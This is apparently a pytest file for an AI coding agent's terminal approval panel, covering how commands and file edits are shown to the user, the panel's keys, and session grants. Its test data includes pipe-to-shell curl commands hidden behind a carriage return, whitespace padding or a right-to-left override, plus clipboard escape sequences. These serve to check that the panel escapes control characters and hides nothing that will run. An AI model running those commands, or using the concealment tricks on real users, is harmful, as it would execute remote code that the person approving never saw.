"""Approvals in the terminal: the panel's text, its keys, and the session's policy."""

from __future__ import annotations

import asyncio
import dataclasses
import re
from pathlib import Path
from typing import Any

import pytest

from localmelo.melo.contracts.approvals import (
    AllowAllPolicy,
    ApprovalDecision,
    ApprovalRequest,
    AutoPolicy,
    DenyAllPolicy,
)
from localmelo.melo.contracts.review import ActionReview
from localmelo.melo.schema import ToolTier
from localmelo.support.cli import edits, theme
from localmelo.support.cli.approvals import (
    APPROVAL_KEY_GUARD_S,
    Approvals,
    EditSnapshots,
    PanelText,
    TerminalApprover,
    approval_words,
    panel_text,
    session_warning,
)
from localmelo.support.cli.render import LiveState
from localmelo.support.cli.text import cells
from localmelo.support.sessions.approvals import RememberingPolicy
from localmelo.tests.cli.ui_helpers import (
    BACKSPACE,
    CTRL_C,
    ENTER,
    ESC,
    FakeController,
    running_app,
)

WORKSPACE = "/home/me/demo-project"


def _request(
    tool: str = "shell_exec", *, tier: ToolTier | None = None, **arguments: Any
) -> ApprovalRequest:
    if not arguments:
        arguments = {"command": "ls -1"}
    return ApprovalRequest(
        request_id="r1",
        run_id="run",
        call_id="c1",
        tool_name=tool,
        arguments=arguments,
        preview="",
        workspace_root=WORKSPACE,
        tier=tier,
    )


# ── The mode in words ──


@pytest.mark.parametrize(
    ("mode", "grants", "words"),
    [
        ("ask", [], "asks before running commands or changing files"),
        (
            "ask",
            ["shell_exec", "file_write", "mcp__files__read"],
            "asks before running commands or changing files · allowed this session: "
            "file writes, mcp__files__read, shell commands",
        ),
        (
            "auto",
            ["shell_exec"],
            "works without asking; blocks risky steps and steps you did not ask "
            "for, and explains them",
        ),
        ("deny", [], "never runs commands or changes files"),
        ("yolo", [], "runs everything without asking (--yolo)"),
    ],
)
def test_the_mode_and_grants_in_words(mode: Any, grants: list[str], words: str) -> None:
    assert approval_words(mode, grants) == words


# ── The panel's text ──


def test_a_shell_command_shows_whole_and_wrapped() -> None:
    command = "echo 'a    b' " + "x" * 50
    text = panel_text(_request(command=command), width=30)
    assert text.title == "Run a shell command?"
    assert text.header == f"shell_exec · in {WORKSPACE}"
    assert "".join(line for _, line in text.body) == command  # nothing dropped
    assert [len(line) for _, line in text.body] == [30, 30, 4]
    assert not text.escaped


def test_python_code_is_numbered() -> None:
    text = panel_text(_request("python_exec", code="import sys\nprint(1)\n"), width=60)
    assert (text.title, [line for _, line in text.body]) == (
        "Run Python code?",
        ["   1 import sys", "   2 print(1)"],
    )


def test_a_new_file_and_an_existing_one() -> None:
    path = f"{WORKSPACE}/todo.md"
    new = panel_text(
        _request("file_write", path=path, content="a\nb\n"),
        target=edits.Target(path=path, exists=False),
        width=60,
    )
    assert new.title == "Write a new file?"
    assert new.header == "file_write  todo.md · new file, 2 lines"
    assert [line for _, line in new.body] == ["   1 a", "   2 b"]
    old = panel_text(
        _request("file_write", path=path, content="b\n"),
        target=edits.Target(path=path, exists=True, size_bytes=2, text="a\n"),
        width=60,
    )
    assert old.title == "Change a file?"
    assert old.header == "file_write  todo.md · +1 −1 lines"
    assert [(style, line) for style, line in old.body] == [
        ("error", "   1 − a"),
        ("ok", "   1 + b"),
    ]


def test_another_tool_shows_its_arguments_as_json() -> None:
    text = panel_text(_request("mcp__web__fetch", url="http://x", n=2), width=60)
    assert text.title == "Call mcp__web__fetch?"
    assert [line for _, line in text.body] == [
        "{",
        '  "url": "http://x",',
        '  "n": 2',
        "}",
    ]


def test_a_site_web_fetch_would_read_asks_to_read_it_not_to_open_it() -> None:
    args: dict[str, Any] = {
        "site": "example.com",
        "origin": "https://example.com",
        "access": "read",
    }
    read = panel_text(
        _request("browser:https://example.com", **args, via="web_fetch"), width=80
    )
    assert read.title == "Read a website?"
    assert read.header.startswith("example.com") and "web_fetch" in read.header
    words = " ".join(line for _, line in read.body)
    assert "read example.com as text" in words and "Safari" not in words
    # The address it asks for, query and all, is on the panel.
    address = "https://example.com/search?q=tomatoes"
    with_url = panel_text(
        _request("browser:https://example.com", **args, via="web_fetch", url=address),
        width=80,
    )
    assert ("", address) in with_url.body
    opened = panel_text(_request("browser:https://example.com", **args), width=80)
    assert opened.title == "Open a website?" and "Safari" in " ".join(
        line for _, line in opened.body
    )


def test_the_header_names_the_tier() -> None:
    shell = panel_text(_request(tier="exec"), width=60)
    assert shell.header == f"shell_exec · exec · in {WORKSPACE}"
    python = panel_text(_request("python_exec", tier="exec", code="print(1)"), width=60)
    assert python.header == f"python_exec · exec · in {WORKSPACE}"


def test_a_file_write_header_names_the_tier_after_the_path() -> None:
    path = f"{WORKSPACE}/todo.md"
    new = panel_text(
        _request("file_write", tier="write", path=path, content="a\nb\n"),
        target=edits.Target(path=path, exists=False),
        width=60,
    )
    assert new.header == "file_write  todo.md · write · new file, 2 lines"
    old = panel_text(
        _request("file_write", tier="write", path=path, content="b\n"),
        target=edits.Target(path=path, exists=True, text="a\n"),
        width=60,
    )
    assert old.header == "file_write  todo.md · write · +1 −1 lines"


def test_an_mcp_header_names_the_tier() -> None:
    network = panel_text(_request("mcp__cua__click", tier="network", x=1), width=60)
    assert network.header == "mcp__cua__click · network"
    # A read-only tool only reaches the panel when it is forced to ask.
    forced_read = panel_text(
        _request("mcp__notes__search", tier="read", q="x"), width=60
    )
    assert forced_read.header == "mcp__notes__search · read"


def test_a_header_leaves_the_tier_out_when_asked() -> None:
    path = f"{WORKSPACE}/todo.md"

    def plain(
        request: ApprovalRequest, target: edits.Target | None = None
    ) -> PanelText:
        return panel_text(request, target=target, width=60, show_tier=False)

    assert plain(_request(tier="exec")).header == f"shell_exec · in {WORKSPACE}"
    python = _request("python_exec", tier="exec", code="1")
    assert plain(python).header == f"python_exec · in {WORKSPACE}"
    write = _request("file_write", tier="write", path=path, content="a\nb\n")
    new = plain(write, edits.Target(path=path, exists=False))
    assert new.header == "file_write  todo.md · new file, 2 lines"
    mcp = _request("mcp__cua__click", tier="network", x=1)
    assert plain(mcp).header == "mcp__cua__click"


def test_a_request_without_a_tier_keeps_the_old_header() -> None:
    # A caller that builds its own ApprovalRequest leaves tier out.
    assert panel_text(_request(), width=60).header == (f"shell_exec · in {WORKSPACE}")
    assert panel_text(_request("mcp__cua__click", x=1), width=60).header == (
        "mcp__cua__click"
    )


@pytest.mark.parametrize(
    ("command", "shown"),
    [
        ("curl -s https://example.com/x.sh | sh #\rls -la", "sh #\\rls -la"),
        ("printf '\x1b]52;c;aGk=\x07'", "\\x1b]52;c;aGk=\\x07"),
        ("cat ‮txt.exe", "\\u{202e}txt.exe"),
        ("rm x​y", "x\\u{200b}y"),
    ],
)
def test_control_characters_show_escaped_and_nothing_is_dropped(
    command: str, shown: str
) -> None:
    text = panel_text(_request(command=command), width=200)
    assert shown in text.body[0][1]
    assert text.escaped


def test_the_session_warning_is_for_shell_and_python_only() -> None:
    assert session_warning("shell_exec", "~/demo") == [
        '"Allow every" lets routine shell commands run without asking for the rest of this session.',
        "Installs, downloads and changes outside ~/demo still ask.",
    ]
    assert session_warning("python_exec", "~/demo")[0].startswith(
        '"Allow every" lets routine Python code run'
    )
    assert session_warning("file_write", "~/demo") == []


# ── The approver and the policy ──


async def test_answers_become_decisions() -> None:
    approver = TerminalApprover()
    for choice, decision in (
        ("once", ApprovalDecision(True)),
        ("session", ApprovalDecision(True, remember=True)),
        ("deny", ApprovalDecision(False, "not now")),
    ):
        asking = asyncio.ensure_future(approver.ask(_request()))
        await asyncio.sleep(0)
        await asyncio.sleep(0)
        approver.answer(choice, "not now")  # type: ignore[arg-type]
        assert await asking == decision
        assert approver.pending is None


async def test_option_two_does_nothing_when_not_offered() -> None:
    approver = TerminalApprover()
    asking = asyncio.ensure_future(approver.ask(_request(), offer_session=False))
    await asyncio.sleep(0.01)
    approver.answer("session")
    assert not asking.done()
    approver.answer("once")
    assert await asking == ApprovalDecision(True)
    # A caller that asks for the session choice does not get it either.
    asking = asyncio.ensure_future(approver.ask(_reviewed(_PIP), offer_session=True))
    await asyncio.sleep(0)
    assert approver.pending is not None and not approver.pending.offer_session
    approver.answer("deny")
    assert await asking == ApprovalDecision(False)


async def test_a_reason_is_kept_to_500_characters() -> None:
    approver = TerminalApprover()
    asking = asyncio.ensure_future(approver.ask(_request()))
    await asyncio.sleep(0.01)
    approver.answer("deny", "x" * 600)
    assert (await asking).reason == "x" * 500


async def test_a_cancellation_withdraws_the_panel() -> None:
    changes: list[bool] = []
    approver = TerminalApprover()
    approver.on_change = lambda: changes.append(approver.pending is not None)
    asking = asyncio.ensure_future(approver.ask(_request()))
    await asyncio.sleep(0.01)
    asking.cancel()
    with pytest.raises(asyncio.CancelledError):
        await asking
    assert approver.pending is None and changes == [True, False]


async def test_the_guard_ignores_keys_just_after_the_panel_opens() -> None:
    now = [10.0]
    approver = TerminalApprover(clock=lambda: now[0])
    asking = asyncio.ensure_future(approver.ask(_request()))
    await asyncio.sleep(0.01)
    assert APPROVAL_KEY_GUARD_S == 0.4
    assert approver.guarded()
    now[0] += APPROVAL_KEY_GUARD_S
    assert not approver.guarded()
    approver.answer("once")
    await asking


async def test_a_file_write_target_is_checked_without_following_it(
    tmp_path: Path,
) -> None:
    link = tmp_path / "link"
    link.symlink_to(tmp_path / "missing")
    approver = TerminalApprover()
    asking = asyncio.ensure_future(
        approver.ask(_request("file_write", path=str(link), content="x"))
    )
    await asyncio.sleep(0.05)
    assert approver.pending is not None
    target = approver.pending.target
    assert target is not None and target.exists and not target.diffable
    assert target.problem == "is not a regular file"
    approver.answer("once")
    await asking


async def test_option_two_grants_the_tool_for_the_session() -> None:
    asked: list[str] = []

    async def ask(request: ApprovalRequest) -> ApprovalDecision:
        asked.append(request.tool_name)
        return ApprovalDecision(True, remember=True)

    approvals = Approvals(ask, "ask")
    policy = approvals.policy()
    assert policy is not None
    await policy.decide(_request())
    later = await policy.decide(_request(command="rm -rf build"))
    assert later == ApprovalDecision(True, origin="session")
    assert asked == ["shell_exec"]
    assert approvals.allowed_tools == {"shell_exec"}
    approvals.reset()
    assert approvals.allowed_tools == frozenset()


def test_yolo_has_no_policy() -> None:
    async def ask(request: ApprovalRequest) -> ApprovalDecision:
        raise AssertionError("never asked")

    assert Approvals(ask, "yolo").policy() is None


# ── The panel on screen ──


@pytest.fixture
def now() -> list[float]:
    return [100.0]


async def test_the_panel_replaces_the_input_box_and_keeps_the_draft(
    now: list[float],
) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    controller = FakeController(state="running")
    async with running_app(controller, approver=approver, clock=lambda: now[0]) as app:
        app.ui.renderer.live = LiveState(activity="Running", started=now[0], step=1)
        app.type("half a draft")
        await app.wait(lambda: app.ui.buffer.text == "half a draft")
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        text = app.text()
        assert "⚠ Waiting for your approval" in text
        assert "╭─ Run a shell command? ─" in text
        assert f"│ shell_exec · in {WORKSPACE}" in text
        assert "│   ls -1" in text
        assert "❯ 1. Yes" in text
        assert "  2. Yes, and allow every shell_exec call in this session" in text
        assert "  3. No, and tell melo why" in text
        assert '"Allow every" lets routine shell commands run without asking' in text
        assert (
            "↑↓ select · enter confirm · 1-3 · v view all · esc stop the turn" in text
        )
        assert "half a draft" not in text
        app.type("1")  # within the guard: ignored
        await app.settle()
        assert not asking.done()
        now[0] += APPROVAL_KEY_GUARD_S + 0.1
        app.type("yna")  # letters never decide
        await app.settle()
        assert not asking.done()
        app.type("1")
        assert await asyncio.wait_for(asking, 3) == ApprovalDecision(True)
        await app.wait(lambda: "half a draft" in app.text())
        assert app.ui.buffer.text == "half a draft"
        assert not app.ui.renderer.live.waiting


@pytest.mark.parametrize(
    ("developer", "header"),
    [
        (False, f"shell_exec · in {WORKSPACE}"),
        (True, f"shell_exec · exec · in {WORKSPACE}"),
    ],
    ids=["default mode", "developer mode"],
)
async def test_the_panel_header_names_the_tier_in_developer_mode_only(
    now: list[float], developer: bool, header: str
) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        app.ui.renderer.developer = developer
        asking = asyncio.ensure_future(approver.ask(_request(tier="exec")))
        await app.wait(lambda: "Run a shell command?" in app.text())
        assert f"│ {header}" in app.text()
        now[0] += APPROVAL_KEY_GUARD_S + 0.1
        app.type("1")
        await asyncio.wait_for(asking, 3)


async def test_the_warning_and_the_key_line_are_default_text_not_dim(
    now: list[float],
) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        fragments = app.ui._panel_fragments()
        rows = {part[1]: part[0] for part in fragments}
        for needle in ('"Allow every" lets', "Installs, downloads and changes"):
            [style] = [style for text, style in rows.items() if needle in text]
            assert style == "", needle  # dim reads at 2.4:1 on a light terminal
        # The key line: each key in the body's ink, its words faint, which is
        # plain (never dim) where the palette has no muted colour.
        start = next(i for i, part in enumerate(fragments) if part[1] == "↑↓")
        keys = fragments[start : start + 4]
        assert [part[0] for part in keys] == [
            "class:key",
            "class:faint",
            "class:faint",
            "class:key",
        ]
        assert "".join(part[1] for part in keys) == "↑↓ select · enter"
        light16 = theme.Palette("16", "light").pt_style
        assert not light16.get_attrs_for_style_str("class:faint").dim
        now[0] += APPROVAL_KEY_GUARD_S + 0.1
        app.type("1")
        await asyncio.wait_for(asking, 3)


async def test_arrows_and_enter_choose_option_two(now: list[float]) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        now[0] += 1
        app.type("\x1b[B")
        await app.wait(lambda: "❯ 2. Yes, and allow every" in app.text(), timeout_s=3)
        app.type(ENTER)
        assert await asyncio.wait_for(asking, 3) == ApprovalDecision(
            True, remember=True
        )


async def test_option_two_is_not_shown_when_not_offered(now: list[float]) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request(), offer_session=False))
        await app.wait(lambda: "Run a shell command?" in app.text())
        # The options are numbered by position: 1 Yes, 2 No.
        assert "2. Yes" not in app.text() and "2. No, and tell melo why" in app.text()
        assert "1-2 · v view all" in app.text()
        now[0] += 1
        app.type("3")
        await app.settle()
        assert not asking.done()
        app.type("1")
        await asyncio.wait_for(asking, 3)


async def test_option_three_asks_for_a_reason(now: list[float]) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        now[0] += 1
        app.type("3")
        await app.wait(lambda: "Reason (optional, enter sends):" in app.text())
        app.type("先别删" + BACKSPACE + "改")
        await app.wait(lambda: app.ui.reason.text == "先别改")
        await app.wait(lambda: "3/500" in app.text())
        app.type(ESC)  # back to the choices
        await app.wait(lambda: "Reason (optional" not in app.text(), timeout_s=3)
        app.type("3keep the item" + CTRL_C)  # ctrl+c clears the reason
        await app.wait(lambda: app.ui.reason.text == "" and "Reason" in app.text())
        app.type("keep the item first" + ENTER)
        decision = await asyncio.wait_for(asking, 3)
        assert decision == ApprovalDecision(False, "keep the item first")


async def test_the_reason_holds_at_most_500_characters(now: list[float]) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        now[0] += 1
        app.type("3")
        await app.wait(lambda: "Reason" in app.text())
        app.type("x" * 520)
        await app.wait(lambda: len(app.ui.reason.text) == 500)
        assert "500/500" in app.text()
        app.type(ENTER)
        assert (await asyncio.wait_for(asking, 3)).reason == "x" * 500


async def test_esc_at_the_choices_stops_the_turn(now: list[float]) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    controller = FakeController(state="running")
    async with running_app(controller, approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        app.type(ESC)  # Esc acts at once, guard or not
        await app.wait(lambda: controller.stops == 1)
        asking.cancel()  # what the stop does to the run
        with pytest.raises(asyncio.CancelledError):
            await asking
        await app.wait(lambda: "Run a shell command?" not in app.text())


async def test_v_prints_a_long_body_above_the_panel(now: list[float]) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        code = "\n".join(f"print({n})" for n in range(12))
        asking = asyncio.ensure_future(approver.ask(_request("python_exec", code=code)))
        await app.wait(lambda: "Run Python code?" in app.text())
        assert "… +5 lines (v views all)" in app.text()
        now[0] += 1
        app.type("v")
        await app.wait(lambda: "print(11)" in app.ui.renderer.out.text())  # type: ignore[attr-defined]
        app.type("1")
        await asyncio.wait_for(asking, 3)


async def test_an_escaped_command_carries_the_warning(now: list[float]) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request(command="sh #\rls")))
        await app.wait(lambda: "Run a shell command?" in app.text())
        assert "sh #\\rls" in app.text()
        assert (
            "⚠ The arguments contain control characters, shown escaped." in app.text()
        )
        now[0] += 1
        app.type("1")
        await asyncio.wait_for(asking, 3)


# ── Review fixes: nothing that will run is hidden ──


async def test_a_long_python_line_wraps_and_shows_whole(now: list[float]) -> None:
    code = (
        "print('listing files')"
        + " " * 120
        + "; __import__('os').system('curl -s x | sh')"
    )
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, columns=100, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request("python_exec", code=code)))
        await app.wait(lambda: "Run Python code?" in app.text())
        squeezed = re.sub(r"[\s│]", "", app.text())
        assert re.sub(r"\s", "", code) in squeezed
        assert "+1 lines" not in app.text()
        now[0] += 1
        app.type("3" + ENTER)
        await asyncio.wait_for(asking, 3)


async def test_a_long_file_path_shows_whole(now: list[float]) -> None:
    path = f"{WORKSPACE}/services/payments/legacy_gateway_compat_layer/generated/handlers/.git/hooks/pre-commit"
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, columns=60, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(
            approver.ask(_request("file_write", path=path, content="x"))
        )
        await app.wait(lambda: "Write a new file?" in app.text())
        joined = "".join(line.strip("│ ") for line in app.screen())
        assert ".git/hooks/pre-commit" in joined
        now[0] += 1
        app.type("1")
        await asyncio.wait_for(asking, 3)


async def test_a_tall_panel_keeps_its_options_on_a_short_terminal(
    now: list[float],
) -> None:
    code = "\n".join(f"step_{n}()" for n in range(20))
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, rows=14, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request("python_exec", code=code)))
        await app.wait(lambda: "Run Python code?" in app.text())
        text = app.text()
        assert "3. No, and tell melo why" in text and "esc stop the turn" in text
        assert "(v views all)" in text
        now[0] += 1
        app.type("1")
        await asyncio.wait_for(asking, 3)


async def test_the_warning_under_option_two_wraps_rather_than_hides_the_folder(
    now: list[float],
) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, columns=40, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        joined = " ".join(" ".join(app.screen()).split())
        assert (
            f"Installs, downloads and changes outside {WORKSPACE} still ask." in joined
        )
        assert "allow every shell_exec call in this session" in joined
        now[0] += 1
        app.type("1")
        await asyncio.wait_for(asking, 3)


def test_long_code_lines_wrap_under_their_number() -> None:
    text = panel_text(
        _request("python_exec", code="x = 1 + 2 + 3 + 4\nprint(x)"),
        width=12,
    )
    assert [line for _, line in text.body] == [
        "   1 x = 1 +",
        "      2 + 3 ",
        "     + 4",
        "   2 print(x",
        "     )",
    ]


# ── Review fixes: the panel's keys ──


async def test_arrows_do_nothing_inside_the_guard(now: list[float]) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        app.type("\x1b[B")  # still browsing the history, say
        await app.settle()
        assert approver.pending is not None and approver.pending.selected == 0
        now[0] += 1
        app.type(ENTER)
        assert await asyncio.wait_for(asking, 3) == ApprovalDecision(True)


async def test_ctrl_c_at_the_choices_stops_the_turn_and_a_second_press_quits(
    now: list[float],
) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    controller = FakeController(state="running")
    async with running_app(controller, approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        app.type(CTRL_C)
        await app.wait(lambda: controller.stops == 1)
        await app.wait(lambda: "press ctrl+c again to quit" in app.text())
        app.type(CTRL_C)
        await app.wait(lambda: not app.ui.app.is_running)
        asking.cancel()


async def test_ctrl_c_in_an_empty_reason_goes_back_to_the_choices(
    now: list[float],
) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    controller = FakeController(state="running")
    async with running_app(controller, approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        now[0] += 1
        app.type("3")
        await app.wait(lambda: "Reason (optional" in app.text())
        app.type(CTRL_C)
        await app.wait(lambda: "Reason (optional" not in app.text())
        assert "❯ 3. No, and tell melo why" in app.text() and controller.stops == 0
        assert approver.pending is not None and not approver.pending.reason
        app.type("1")
        assert await asyncio.wait_for(asking, 3) == ApprovalDecision(True)


@pytest.mark.parametrize("columns", [30, 40, 50])
async def test_the_reason_typed_shows_on_a_narrow_terminal(
    now: list[float], columns: int
) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(
        approver=approver, columns=columns, clock=lambda: now[0]
    ) as app:
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        now[0] += 1
        app.type("3")
        await app.wait(lambda: "Reason" in app.text())
        app.type("keep it")
        await app.wait(lambda: "Reason: keep it" in app.text())
        app.type(ENTER)
        assert (await asyncio.wait_for(asking, 3)).reason == "keep it"


async def test_the_panel_shows_no_cursor_but_the_reason_field_does(
    now: list[float],
) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        assert not app.cursor_hidden()  # the input box's cursor
        asking = asyncio.ensure_future(approver.ask(_request()))
        await app.wait(lambda: "Run a shell command?" in app.text())
        await app.settle()
        assert app.cursor_hidden()
        now[0] += 1
        app.type("3")
        await app.wait(lambda: "Reason (optional" in app.text())
        await app.settle()
        assert not app.cursor_hidden()
        app.type(ENTER)
        await asyncio.wait_for(asking, 3)


# ── Snapshots, modes and grants ──


async def test_a_file_write_is_snapshotted_before_it_is_answered(
    tmp_path: Path,
) -> None:
    path = tmp_path / "todo.md"
    path.write_text("a\n", encoding="utf-8")
    snapshots = EditSnapshots(AllowAllPolicy())
    request = _request("file_write", path=str(path), content="b\n")
    decision = await snapshots.decide(request)
    assert decision.allow and decision.origin == "policy"
    snapshot = snapshots.take(request.request_id)
    assert snapshot is not None
    assert (snapshot.target.text, snapshot.new) == ("a\n", "b\n")
    assert (snapshot.added, snapshot.removed) == (1, 1)
    assert snapshots.take(request.request_id) is None


async def test_another_tool_is_not_snapshotted() -> None:
    snapshots = EditSnapshots(AllowAllPolicy())
    request = _request()
    await snapshots.decide(request)
    assert snapshots.take(request.request_id) is None


def test_the_modes_wrap_the_policy() -> None:
    async def ask(request: ApprovalRequest) -> ApprovalDecision:
        return ApprovalDecision(True)

    approvals = Approvals(ask, "ask")
    assert approvals.policy() is approvals.snapshots
    assert isinstance(approvals.snapshots.inner, RememberingPolicy)
    approvals.set_mode("auto")
    assert approvals.policy() is approvals.snapshots
    assert isinstance(approvals.snapshots.inner, AutoPolicy)
    assert approvals.snapshots.inner is approvals._auto
    approvals.set_mode("deny")
    policy = approvals.policy()
    assert isinstance(policy, DenyAllPolicy)
    assert policy.reason == "approvals are set to deny"
    assert Approvals(ask, "yolo").policy() is None


async def test_auto_mode_blocks_a_high_impact_call_without_asking() -> None:
    asked: list[ApprovalRequest] = []

    async def ask(request: ApprovalRequest) -> ApprovalDecision:
        asked.append(request)
        return ApprovalDecision(False, "no")

    approvals = Approvals(ask, "auto")
    policy = approvals.policy()
    assert policy is not None
    pip = dataclasses.replace(
        _request("shell_exec", command="pip install x"),
        review=ActionReview("high", ("install",), ("Installs x with pip.",)),
    )
    ls = dataclasses.replace(_request(), review=ActionReview("routine"))
    assert await policy.decide(ls) == ApprovalDecision(True, origin="auto")
    assert await policy.decide(pip) == ApprovalDecision(
        False, "installs software", origin="auto"
    )
    assert asked == []  # nobody is asked in auto mode
    # A new chat forgets the allowances of the old one.
    old = approvals._auto
    approvals.reset()
    assert approvals._auto is not old


async def test_grants_survive_auto_and_ask_until_forgotten() -> None:
    async def ask(request: ApprovalRequest) -> ApprovalDecision:
        return ApprovalDecision(True, remember=True)

    approvals = Approvals(ask, "ask")
    policy = approvals.policy()
    assert policy is not None
    await policy.decide(_request("shell_exec"))
    await policy.decide(_request("python_exec", code="1"))
    assert approvals.allowed_tools == {"shell_exec", "python_exec"}
    approvals.set_mode("auto")
    approvals.set_mode("ask")
    assert approvals.allowed_tools == {"shell_exec", "python_exec"}
    approvals.forget("shell_exec")
    assert approvals.allowed_tools == {"python_exec"}
    approvals.forget()
    assert approvals.allowed_tools == set()
    approvals.reset()
    assert approvals.allowed_tools == set()


def test_a_file_that_cannot_be_diffed_says_why() -> None:
    path = f"{WORKSPACE}/big.txt"
    target = edits.Target(
        path=path,
        exists=True,
        size_bytes=1_200_000,
        problem="overwrites a 1.2 MB file",
    )
    text = panel_text(
        _request("file_write", path=path, content="a\n"), target=target, width=60
    )
    assert text.title == "Change a file?"
    assert (
        text.header == "file_write  big.txt · overwrites a 1.2 MB file; no diff shown"
    )
    assert [line for _, line in text.body] == ["   1 a"]


def test_the_diff_uses_the_uis_minus() -> None:
    path = f"{WORKSPACE}/todo.md"
    text = panel_text(
        _request("file_write", path=path, content="b\n"),
        target=edits.Target(path=path, exists=True, text="a\n"),
        width=60,
        minus="-",
    )
    assert text.header.endswith("+1 -1 lines")
    assert [line for _, line in text.body] == ["   1 - a", "   1 + b"]


async def test_the_diff_panel_renders(tmp_path: Path) -> None:
    path = tmp_path / "notes.txt"
    path.write_text("buy milk\n", encoding="utf-8")
    approver = TerminalApprover()
    request = _request("file_write", path=str(path), content="remember the milk\n")
    async with running_app(approver=approver, columns=80, clock=lambda: 100.0) as app:
        asking = asyncio.ensure_future(approver.ask(request))
        await app.wait(lambda: "Change a file?" in app.text(), timeout_s=15)
        # It rendered: before the style fix this raised and no frame came.
        assert "file_write" in app.text() and "1. Yes" in app.text()
        approver.answer("once")
        await asking


def test_the_diff_context_is_dim() -> None:
    path = f"{WORKSPACE}/todo.md"
    text = panel_text(
        _request("file_write", path=path, content="a\nB\nc\n"),
        target=edits.Target(path=path, exists=True, text="a\nb\nc\n"),
        width=60,
    )
    context = [style for style, line in text.body if line.strip().endswith(" c")]
    assert context and all(style == "muted" for style in context)


async def test_a_file_changed_while_the_panel_waits_is_denied(tmp_path: Path) -> None:
    path = tmp_path / "notes.txt"
    path.write_text("old\n", encoding="utf-8")

    async def ask_and_rewrite(request: ApprovalRequest) -> ApprovalDecision:
        path.write_text("someone else's newer line\n", encoding="utf-8")
        return ApprovalDecision(True)

    snapshots = EditSnapshots(RememberingPolicy(ask_and_rewrite))
    decision = await snapshots.decide(
        _request("file_write", path=str(path), content="mine\n")
    )
    assert not decision.allow and decision.origin == "policy"
    assert "changed while this was waiting" in decision.reason


async def test_a_file_created_while_the_panel_waits_is_denied(tmp_path: Path) -> None:
    path = tmp_path / "new.txt"

    async def ask_and_create(request: ApprovalRequest) -> ApprovalDecision:
        path.write_text("someone else's file\n", encoding="utf-8")
        return ApprovalDecision(True)

    snapshots = EditSnapshots(RememberingPolicy(ask_and_create))
    decision = await snapshots.decide(
        _request("file_write", path=str(path), content="mine\n")
    )
    assert not decision.allow and decision.origin == "policy"


async def test_a_new_file_left_alone_while_the_panel_waits_is_allowed(
    tmp_path: Path,
) -> None:
    path = tmp_path / "new.txt"

    async def ask(request: ApprovalRequest) -> ApprovalDecision:
        return ApprovalDecision(True)

    snapshots = EditSnapshots(RememberingPolicy(ask))
    decision = await snapshots.decide(
        _request("file_write", path=str(path), content="mine\n")
    )
    assert decision.allow


async def test_the_frame_is_warn_its_title_bold_the_choice_a_band_and_a_diff_banded(
    now: list[float], tmp_path: Any
) -> None:
    path = tmp_path / "todo.md"
    path.write_text("a\nb\n", encoding="utf-8")
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(
            approver.ask(_request("file_write", path=str(path), content="a\nc\n"))
        )
        await app.wait(lambda: "Change a file?" in app.text())
        parts = app.ui._panel_fragments()
        assert parts[:2] == [("class:frame", "╭─ "), ("class:title", "Change a file?")]
        assert all(
            style == "class:frame" for style, text, *_ in parts if text in ("│ ", " │")
        )
        added = [p for p in parts if p[0] == "class:diff_add" and "+ c" in p[1]]
        removed = [p for p in parts if p[0] == "class:diff_remove" and "b" in p[1]]
        assert added and removed
        # The band fills the panel's inner width: 80 columns less the frame.
        row = next(i for i, p in enumerate(parts) if p in added)
